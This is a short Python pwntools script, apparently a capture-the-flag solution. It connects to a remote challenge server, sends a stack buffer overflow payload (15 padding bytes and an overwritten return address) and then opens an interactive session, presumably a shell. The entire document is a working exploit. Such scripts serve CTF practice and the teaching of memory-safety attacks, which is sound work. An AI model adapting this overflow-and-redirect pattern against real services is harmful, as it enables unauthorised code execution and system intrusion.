from pwn import *

p = remote("node5.buuoj.cn", 25284)

playload = b'a' * 15 + p64(0x401186)

p.sendline(playload)

p.interactive()